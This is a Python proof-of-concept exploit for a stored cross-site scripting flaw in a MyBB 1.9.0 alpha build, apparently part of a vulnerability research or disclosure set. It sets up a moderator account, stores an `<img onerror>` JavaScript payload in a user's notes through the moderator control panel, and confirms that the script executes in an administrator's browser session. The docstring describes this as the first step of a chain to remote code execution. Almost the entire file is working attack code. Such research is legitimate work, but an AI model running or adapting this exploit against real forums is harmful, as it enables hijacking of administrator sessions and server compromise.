#!/usr/bin/env python3
"""
VULN-004 — Stored XSS in moderator "user notes" (moderator -> staff/admin -> RCE).

Target  : MyBB 1.9.0-alpha.1 (dev-1.9, commit f8bf4e8)
Store   : targets/mybb/modcp.php:2287 (usernotes = raw input) -> UserDataHandler('update')
          -> inc/datahandlers/user.php:1452 ($db->escape_string only — NO HTML escape)
Render  : member.php:1992 (nl2br, no sanitise) -> member/viewnotes.twig:5 ({{ user.usernotes|raw }})
Class   : CWE-79 Stored XSS via insert-vs-update encoding asymmetry

The flaw
--------
The insert path HTML-escapes usernotes (~user.php:1185) and the ModCP edit-form
prefill escapes too — masking the bug — but the UPDATE path escapes ONLY for SQL
(user.php:1452). A moderator with caneditprofiles submits modcp do_editprofile;
the note is stored with HTML intact and rendered `|raw` at
member.php?action=viewnotes, so it executes in the session of any `canmodcp`
staff member (admin for the RCE leg -> same-origin ACP -> template eval()).

What a successful run proves
---------------------------
A moderator-stored `<img onerror>` note is served UN-escaped at viewnotes and
executes (alert fires) in an administrator's session.
"""
import os
import sys

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
import mybb_common as m

_USE_COLOR = sys.stdout.isatty() and not os.environ.get("NO_COLOR")
_C = {"INFO": "36", "SETUP": "33", "STEP": "33", "PROOF": "35", "OK": "32", "FAIL": "31"}


def log(tag, msg):
    print((f"\033[1;{_C[tag]}m[{tag}]\033[0m " if _USE_COLOR and tag in _C else f"[{tag}] ") + msg)


HERE = os.path.dirname(os.path.abspath(__file__))
BASE = m.BASE_URL
MARKER = "xss" + m.secrets.token_hex(3)
PAYLOAD = f"<img src=x onerror=\"alert(document.domain);window.__xss='{MARKER}'\">"


def main():
    print("=" * 72)
    print("VULN-004: Stored XSS in moderator user-notes (mod -> staff/admin)")
    print(f"Target: {BASE}")
    print("=" * 72)
    log("INFO", "exercising modcp.php:2287 update path -> member/viewnotes.twig:5 |raw sink")

    # --- precondition: attacker is a moderator (super mod => caneditprofiles)
    mod = m.rand("mod_")
    mod_pw = "Mpass!" + m.secrets.token_hex(3)
    log("SETUP", f"creating a MODERATOR {mod} (Super Moderators gid 3: canmodcp=1, caneditprofiles=1)")
    mod_uid = m.create_user(mod, mod_pw, usergroup=3)
    # the victim-held target user whose notes the mod edits
    target = m.rand("target_")
    t_uid = m.create_user(target, "Tpass!" + m.secrets.token_hex(3))
    log("SETUP", f"creating an ordinary target user {target} (uid={t_uid}) to attach the note to")

    mc = m.new_session()
    if not m.login(mc, mod, mod_pw):
        log("FAIL", "moderator login failed")
        return 1
    pk = m.post_key(mc, "/newthread.php?fid=2")
    log("INFO", f"moderator uid={mod_uid} logged in; my_post_key acquired")

    # --- store the payload through the moderator profile editor ------------ #
    log("STEP", f"POST modcp.php do_editprofile uid={t_uid} usernotes=<img onerror=...>")
    log("INFO", "usernotes on the UPDATE path is SQL-escaped only (user.php:1452) — HTML survives")
    r = mc.post("/modcp.php", data={
        "action": "do_editprofile", "uid": str(t_uid),
        "usernotes": PAYLOAD,
        "website": "", "signature": "",
        "bday1": "0", "bday2": "0", "bday3": "0",
        "away": "0",
        "my_post_key": pk,
    }, allow_redirects=True)
    stored = m.db_rows(f"SELECT usernotes FROM mybb_users WHERE uid={t_uid};")[0][0]
    log("INFO", f"stored usernotes in DB = {stored!r}")
    if PAYLOAD not in stored:
        log("FAIL", "payload not stored verbatim (handler may have rejected or escaped it)")
        return 1
    log("PROOF", "payload persisted with HTML intact in mybb_users.usernotes (no HTML-escape on update)")

    # --- HTTP proof: a staff member (admin) views the notes ---------------- #
    log("STEP", "logging in as administrator (canmodcp staff — the victim)")
    adm = m.admin_session()
    log("STEP", f"admin opens member.php?action=viewnotes&uid={t_uid}")
    rr = adm.get(f"/member.php?action=viewnotes&uid={t_uid}")
    body = rr.text
    raw_present = PAYLOAD in body
    escaped = PAYLOAD.replace("<", "&lt;").replace(">", "&gt;") in body
    log("INFO", f"viewnotes HTTP {rr.status_code}; raw payload present={raw_present}; escaped={escaped}")
    ok_http = raw_present and not escaped
    if ok_http:
        log("PROOF", "the moderator-stored note is served UNescaped at viewnotes "
                     "(member/viewnotes.twig:5 |raw) — markup reaches the staff DOM")
    with open(os.path.join(HERE, "request.http"), "w") as f:
        f.write("# (1) store  POST /modcp.php action=do_editprofile uid=%d usernotes=<img onerror=...>\n"
                "# (2) fire   GET  /member.php?action=viewnotes&uid=%d (as canmodcp staff)\n\n"
                "GET /member.php?action=viewnotes&uid=%d HTTP/1.1\nHost: %s\n"
                "Cookie: mybbuser=<ADMIN uid_loginkey>\n\n"
                % (t_uid, t_uid, t_uid, BASE.split('://')[1]))
    idx = body.find(MARKER)
    with open(os.path.join(HERE, "response.txt"), "w") as f:
        f.write(f"HTTP/1.1 {rr.status_code}\n\n... region around the stored note in the admin's viewnotes modal ...\n\n")
        f.write(body[max(0, idx - 200):idx + 200] if idx >= 0 else body[:400])

    # --- browser proof ----------------------------------------------------- #
    log("STEP", "opening viewnotes in real Chromium with the ADMIN cookie")
    fired, transcript = m.browser_dialog_check(
        f"{BASE}/member.php?action=viewnotes&uid={t_uid}", mybbuser=adm.cookies["mybbuser"],
        screenshot_rel="exploits/VULN-004/evidence/xss_fired.png", marker=MARKER)
    print("    " + transcript.strip().replace("\n", "\n    "))
    if fired:
        log("PROOF", "Chromium executed the stored note in the ADMIN session — alert() fired "
                     "(evidence/xss_fired.png)")

    print("-" * 72)
    if ok_http and fired:
        log("OK", "exploit confirmed — moderator-stored note executes JS in an admin session")
        print("==> VULN-004: CONFIRMED — stored XSS mod->admin via user-notes (RCE chain)")
        return 0
    if ok_http:
        log("OK", "exploit confirmed — moderator-stored note served unescaped at viewnotes")
        print("==> VULN-004: CONFIRMED — stored XSS lands in executable HTML at viewnotes")
        return 0
    log("FAIL", "note not served unescaped — sink may be patched")
    print("==> VULN-004: FAILED")
    return 1


if __name__ == "__main__":
    sys.exit(main())
